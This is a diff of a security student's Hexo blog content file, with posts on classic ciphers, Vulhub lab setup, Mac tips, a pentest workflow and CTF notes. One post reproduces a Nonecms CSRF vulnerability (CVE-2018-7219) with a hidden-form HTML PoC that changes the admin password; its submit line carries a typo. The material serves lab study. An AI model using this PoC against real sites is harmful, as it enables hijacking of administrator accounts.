+<h2 id="凯撒密码-Caesar"><a href="#凯撒密码-Caesar" class="headerlink" title="凯撒密码 Caesar"></a>凯撒密码 Caesar</h2><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>培根密码只包含了两种不同的字符’A’和’B’，转换规则如下：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582025319658.jpg"></p>
+<h2 id="ASCII-码"><a href="#ASCII-码" class="headerlink" title="ASCII 码"></a>ASCII 码</h2><h2 id="幂数加密-amp-云影密码"><a href="#幂数加密-amp-云影密码" class="headerlink" title="幂数加密 &amp; 云影密码"></a>幂数加密 &amp; 云影密码</h2><h2 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h2><h2 id="杰斐逊转轮密码"><a href="#杰斐逊转轮密码" class="headerlink" title="杰斐逊转轮密码"></a>杰斐逊转轮密码</h2>]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175)</title>
     <url>/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
@@ -710,6 +900,38 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux安装Docker和Vulhub步骤</title>
+    <url>/2022/07/04/Linux%E5%AE%89%E8%A3%85Docker%E5%92%8CVulhub%E6%AD%A5%E9%AA%A4/</url>
+    <content><![CDATA[<h1 id="kali切换root用户"><a href="#kali切换root用户" class="headerlink" title="kali切换root用户"></a>kali切换root用户</h1><p>新安装的kali是没有设置root用户的，默认登录账号 <code>kali: kali</code> ，首先需要通过指令设置root账号密码，确认密码后可以进行用户切换了:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置root账户密码</span><br><span class="line">sudo passwd root</span><br><span class="line"># 切换root用户</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<p>!(1.root切换)[kali切换root用户]</p>
+<h1 id="安装docker和vulhub"><a href="#安装docker和vulhub" class="headerlink" title="安装docker和vulhub"></a>安装docker和vulhub</h1><p>切换到root用户之后，依次输入以下指令做一些准备工作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>
+
+<p>下载docker引擎并查看其版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker </span><br><span class="line"># 查看docker状态</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<p>接下来安装docker-compose并查看其版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip </span><br><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
+
+<p>下载vulhub：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+
+<p>进入到vulhub下对应目录启动docker即可成功搭建靶场，启动后运行在浏览器<code>http://your-ip:8080</code>中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译并运行漏洞环境</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"># 关闭靶场</span><br><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
+
+<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Docker</tag>
+        <tag>Vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Machine Learning 2021 Spring - Day1</title>
     <url>/2021/09/06/Machine-Learning-2021-Spring-Day1/</url>
     <content><![CDATA[<h2 id="一、机器学习基本概念"><a href="#一、机器学习基本概念" class="headerlink" title="一、机器学习基本概念"></a>一、机器学习基本概念</h2><blockquote class="blockquote-center">
@@ -1008,34 +1230,25 @@
       </tags>
   </entry>
   <entry>
-    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
-    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
-    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
-<span id="more"></span>
-
-
-<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
-<p>以修改管理员密码为例，来说明漏洞详情：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
-<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
-<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
-<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
-<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
-<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
-<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
-<h4> 参考链接</h4>
-
-<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
+    <title>Mac查看隐藏文件</title>
+    <url>/2022/08/11/Mac%E6%9F%A5%E7%9C%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h3 id="方式一：在终端运行命令显示隐藏文件"><a href="#方式一：在终端运行命令显示隐藏文件" class="headerlink" title="方式一：在终端运行命令显示隐藏文件"></a>方式一：在终端运行命令显示隐藏文件</h3><p>在电脑桌面点击左侧的图标，接着在启动台里面搜索终端，点击黑色的图标启动终端：</p>
+<ul>
+<li>Mac显示“隐藏文件”命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool true</span><br></pre></td></tr></table></figure></li>
+<li>Mac隐藏“隐藏文件”命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool false</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="方式二：快捷键显示隐藏文件"><a href="#方式二：快捷键显示隐藏文件" class="headerlink" title="方式二：快捷键显示隐藏文件"></a>方式二：快捷键显示隐藏文件</h3><p>在 Finder 打开想要查看隐藏文件的文件夹:</p>
+<ul>
+<li>显示隐藏文件快捷键: <code>Command + Shift + .</code></li>
+<li>恢复隐藏文件的话再次按: <code>Shift + Command + .</code> <span class="label [warning]">此方法适用于macOS Sierra或以上的系统</span></li>
+</ul>
+<h3 id="用第三方应用程序-Funter-显示隐藏文件"><a href="#用第三方应用程序-Funter-显示隐藏文件" class="headerlink" title="用第三方应用程序 Funter 显示隐藏文件"></a>用第三方应用程序 Funter 显示隐藏文件</h3><p>Funter 是 Mac 上的一款高级文件隐藏工具，支持在 Finder 中切换隐藏文件的可见性。<br>用 Funter 显示隐藏文件的操作过程很简单，启动 Funter，单击菜单栏中的显示隐藏文件，打开查找器，在那里你会看到你的隐藏文件们。</p>
 ]]></content>
       <categories>
-        <category>CVE</category>
+        <category>配置</category>
       </categories>
       <tags>
-        <tag>CVE</tag>
-        <tag>CSRF</tag>
+        <tag>Mac</tag>
       </tags>
   </entry>
   <entry>
@@ -1140,6 +1353,37 @@ $ hexo d # == hexo deploy 上传
       </tags>
   </entry>
   <entry>
+    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
+    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
+    <content><![CDATA[<p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
+<span id="more"></span>
+
+
+<p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
+<p>以修改管理员密码为例，来说明漏洞详情：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
+<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
+<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
+<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
+<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
+<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
+<h4> 参考链接</h4>
+
+<p><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Sublime text3配置PHP</title>
     <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
     <content><![CDATA[<h4 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h4><blockquote>
@@ -1208,24 +1452,6 @@ $ hexo d # == hexo deploy 上传
         <tag>PHP</tag>
         <tag>Sublime text3</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/07/26/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>Windows转Mac继续管理GitHub博客</title>
@@ -1301,347 +1527,22 @@ $ hexo d # == hexo deploy 上传
       </tags>
   </entry>
   <entry>
-    <title>网站渗透测试流程</title>
-    <url>/2022/07/04/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
-    <content><![CDATA[<span id="more"></span>
+    <title>Hello World</title>
+    <url>/2021/07/26/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><ol>
-<li>确定范围：测试目标的范围，IP、域名、内外网</li>
-<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等</li>
-<li>确定需求：web应用的漏洞（新上线程序）？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等</li>
-<li>根据需求和技术能力来确定自己能不能做，能做多少</li>
-</ol>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
-<li>方式：主动扫描、开放搜索等</li>
-<li>开放搜索：利用搜索引擎获得、后台、未授权页面、敏感URL等</li>
-<li>基础信息：IP、网段、域名、端口</li>
-<li>系统信息：操作系统版本</li>
-<li>应用信息：各端口的应用，例如web应用、邮件应用等</li>
-<li>版本信息：所有这些探测到的东西的版本</li>
-<li>服务信息</li>
-<li>人员信息：域名注册人员信息、web应用中网站发帖ID、管理员姓名等</li>
-<li>防护信息：试着看能否探测到防护设备</li>
-</ol>
-<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>利用上一步列出的各种系统和应用等相应的漏洞</p>
-<ol>
-<li>方法：<ul>
-<li>漏扫、AWVS、IBM appscan等</li>
-<li>结合漏洞去exploit-db等位置找利用</li>
-<li>网上寻找验证poc</li>
-</ul>
-</li>
-<li>内容：<ul>
-<li>系统漏洞：系统没有及时打补丁</li>
-<li>Webserver漏洞：Webserver配置问题</li>
-<li>Web应用漏洞：Web应用开发问题</li>
-<li>其他端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
-<li>通信安全：明文传输、token在cookie中传输等</li>
-</ul>
-</li>
-</ol>
-<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>将上一步发现的有可能可以成功利用的全部漏洞都验证一边，结合实际情况搭建模拟环境试验，成功后再应用于目标中</p>
-<ul>
-<li>自动化验证：结合自动化扫描工具提供的结果</li>
-<li>手工验证：根据公开资源进行验证</li>
-<li>试验验证：自己搭建模拟环境进行验证</li>
-<li>登陆猜解：有时可以尝试猜测破解一下登录的账号密码等信息</li>
-<li>业务漏洞验证：如发现业务漏洞要进行验证</li>
-</ul>
-<h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><ol>
-<li>按需整理：按照之前第一步跟客户确定好的范围、需求来整理资料，并将其形成报告</li>
-<li>补充介绍：对漏洞成因、验证过程和带来危害进行分析</li>
-<li>修补建议：对所有产生的问题提出合理高效安全的解决办法</li>
-</ol>
-<hr>
-<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1kT411576m?p=9&share_source=copy_web">哔哩哔哩网站渗透测试流程教程</a></p>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>配置MAC终端自动补全命令行</title>
-    <url>/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
-    <content><![CDATA[<ol>
-<li>打开终端，在命令行输入 <code>nano .inputrc</code> 然后回车运行会进入一个编辑页面</li>
-<li>将下列语句输入到文件中：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set completion-ignore-case on</span><br><span class="line">set show-all-if-ambiguous on</span><br><span class="line">TAB: menu-complete</span><br></pre></td></tr></table></figure>
-<img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/1.inputrc.png" alt=".inputrc"></li>
-<li>输入完成之后 <code>Control + O</code> 保存文件然后按回车，之后 <code>Control + X</code> 退出编辑页面，然后重启终端就可以了（可以再次执行步骤1检查是否正确输入）<br><img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/2.success.png" alt="success"></li>
-</ol>
-<hr>
-<p><strong>参考链接</strong></p>
-<p><a href="https://blog.csdn.net/qq_41134710/article/details/118573124">如何配置MAC的终端自动补全命令行</a></p>
-]]></content>
-      <categories>
-        <category>配置</category>
-      </categories>
-      <tags>
-        <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mac查看隐藏文件</title>
-    <url>/2022/08/11/Mac%E6%9F%A5%E7%9C%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h3 id="方式一：在终端运行命令显示隐藏文件"><a href="#方式一：在终端运行命令显示隐藏文件" class="headerlink" title="方式一：在终端运行命令显示隐藏文件"></a>方式一：在终端运行命令显示隐藏文件</h3><p>在电脑桌面点击左侧的图标，接着在启动台里面搜索终端，点击黑色的图标启动终端：</p>
-<ul>
-<li>Mac显示“隐藏文件”命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool true</span><br></pre></td></tr></table></figure></li>
-<li>Mac隐藏“隐藏文件”命令：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool false</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="方式二：快捷键显示隐藏文件"><a href="#方式二：快捷键显示隐藏文件" class="headerlink" title="方式二：快捷键显示隐藏文件"></a>方式二：快捷键显示隐藏文件</h3><p>在 Finder 打开想要查看隐藏文件的文件夹:</p>
-<ul>
-<li>显示隐藏文件快捷键: <code>Command + Shift + .</code></li>
-<li>恢复隐藏文件的话再次按: <code>Shift + Command + .</code> <span class="label [warning]">此方法适用于macOS Sierra或以上的系统</span></li>
-</ul>
-<h3 id="用第三方应用程序-Funter-显示隐藏文件"><a href="#用第三方应用程序-Funter-显示隐藏文件" class="headerlink" title="用第三方应用程序 Funter 显示隐藏文件"></a>用第三方应用程序 Funter 显示隐藏文件</h3><p>Funter 是 Mac 上的一款高级文件隐藏工具，支持在 Finder 中切换隐藏文件的可见性。<br>用 Funter 显示隐藏文件的操作过程很简单，启动 Funter，单击菜单栏中的显示隐藏文件，打开查找器，在那里你会看到你的隐藏文件们。</p>
-]]></content>
-      <categories>
-        <category>配置</category>
-      </categories>
-      <tags>
-        <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决Hexo部署Github时页面显示问题</title>
-    <url>/2022/08/12/%E8%A7%A3%E5%86%B3Hexo%E9%83%A8%E7%BD%B2Github%E6%97%B6%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>检查 <code>_config.yml</code> 文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:xinkjung  # 仓库地址</span><br><span class="line">  branch: master  # hexo </span><br></pre></td></tr></table></figure>
-
-<p>发现不知道什么时候改为了 <code>hexo</code> ，文件都上传到 <code>hexo</code> 目录下去了，修改为 <code>master</code> 即可。</p>
-<p>然后执行命令 <code>hexo clean</code>、<code>hexo d -g</code>尝试，这样就成功解决了。</p>
-]]></content>
-      <tags>
-        <tag>Hexo</tag>
-        <tag>Blog</tag>
-        <tag>Github</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF 成长之路</title>
-    <url>/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</url>
-    <content><![CDATA[<h1 id="一些题库练习"><a href="#一些题库练习" class="headerlink" title="一些题库练习"></a>一些题库练习</h1><h2 id="Bugku-CTF"><a href="#Bugku-CTF" class="headerlink" title="Bugku CTF"></a>Bugku CTF</h2><p>签到题就不必了哈，公众号关注回复即可拿到 flag ，了解一个基础格式 <code>flag&#123;key&#125;</code></p>
-<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><blockquote>
-<p>描述：计算正确即可得到flag</p>
-</blockquote>
-<p>启动场景发现就是一个很简单的html页面，对图片里的算式进行计算： </p>
-<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580428948703.jpg" alt="计算器"><br>输入答案发现输入框只能输入一位数字，验证提示输入失败！查看网页代码发现对输入框长度进行了限制，只需要将其改为我们所需要的长度即可成功输入答案通过验证</p>
-<h4 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h4><blockquote>
-<p>描述: Simple_SSTI_1</p>
-</blockquote>
-<p>根据描述我们可知应该是 <strong>服务器模版注入</strong> ，启动场景网页提示，“你需要传入一个名为flag的参数”：</p>
-<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580432363022.jpg" alt="Simple_SSTI_1"><br>查看网页源代码发现最下端有提示：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580435206034.jpg"></p>
-<ul>
-<li>flask：是由python实现的一种微web框架   </li>
